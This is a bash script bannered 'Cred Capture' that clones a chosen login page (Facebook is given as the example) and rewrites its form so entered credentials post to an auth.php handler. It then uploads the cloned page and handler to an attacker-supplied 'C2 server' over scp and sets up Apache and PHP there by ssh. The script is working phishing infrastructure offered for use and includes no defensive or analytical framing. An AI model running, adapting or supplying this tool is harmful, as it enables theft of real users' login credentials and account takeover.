#!/bin/bash
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
clear='\033[0m'
cat << "EOF"
 _____              _                 
/  __ \            | |                
| /  \/_ __ ___  __| |                
| |   | '__/ _ \/ _` |                
| \__/\ | |  __/ (_| |                
 \____/_|  \___|\__,_|                
                                      
                                      
 _____             _                  
/  __ \           | |                 
| /  \/ __ _ _ __ | |_ _   _ _ __ ___ 
| |    / _` | '_ \| __| | | | '__/ _ \
| \__/\ (_| | |_) | |_| |_| | | |  __/
 \____/\__,_| .__/ \__|\__,_|_|  \___|
            | |                       
            |_|                       

EOF
echo""
echo -e ${green}"Enter Login URL To Clone. Example: https://www.facebook.com"${clear}
echo ""
read URL
echo ""
echo -e ${yellow}"Cloning $URL"${clear}
/usr/bin/chromium-browser --no-sandbox 2>/dev/null
runuser -u pi -- ./SingleFile/cli/single-file $URL --browser-executable-path=/usr/bin/chromium-browser /home/pi/index.html
echo ""
sleep 2
echo -e ${yellow}"Login Cloned Successfully"${clear}
echo ""
echo -e ${yellow}"Redirecting HTML To Capture Credentials"${clear}
sed -i 's/action=.*/action=auth.php method=post >/' /home/pi/index.html
echo ""
cp html/loading.html .
echo -e ${yellow}"Moving Index File"${clear}
echo ""
mv /home/pi/index.html Landing_Pages/
echo -e ${green}"Enter the IP or domain of your C2 server"${clear}
echo ""
read C2
echo ""
cp Resources/auth.php .
sed -i s/domain/$C2/g auth.php
echo -e ${green}"Enter the user of your C2 server. EXAMPLE: root"${clear}
echo ""
read user
echo ""
echo -e ${green}"Copying Resources To C2"${clear}
echo ""
scp auth.php loading.html Landing_Pages/index.html ${user}@${C2}:/var/www/html/
ssh ${user}@${C2} chown -R www-data:www-data /var/www/html/ && apt install php apache2 -y && systemctl start apache2
